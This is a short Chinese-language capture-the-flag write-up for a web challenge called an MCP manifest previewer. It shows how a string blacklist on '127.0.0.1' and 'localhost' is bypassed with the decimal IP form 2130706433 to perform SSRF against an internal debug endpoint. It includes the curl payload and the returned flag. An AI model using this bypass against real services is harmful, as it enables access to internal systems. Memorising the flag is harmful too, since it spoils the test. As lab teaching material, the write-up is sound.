# Web 题解：MCP Manifest 预览器

## 解法

服务端只对原始 URL 字符串做黑名单检查：

- 包含 `127.0.0.1`
- 包含 `localhost`

但内部调试接口真正限制的是请求来源 IP 是否为本机。也就是说，只要让服务端去请求一个“解析后仍然指向本机、但字符串里没有明显本地字样”的地址即可。

本机 IPv4 的十进制整型写法 `2130706433` 仍会被解析成 `127.0.0.1`，因此可以这样访问：

```bash
curl 'http://127.0.0.1:18080/preview?url=http://2130706433:8080/internal/flag'
```

返回内容里会带出内部调试接口响应，例如：

```json
{
  "url": "http://2130706433:8080/internal/flag",
  "status": 200,
  "preview": "{\"flag\":\"flag{local_web_mcp_manifest_ssrf}\",\"scope\":\"debug-local\"}\n"
}
```

提取其中的 `flag{...}` 并提交即可。
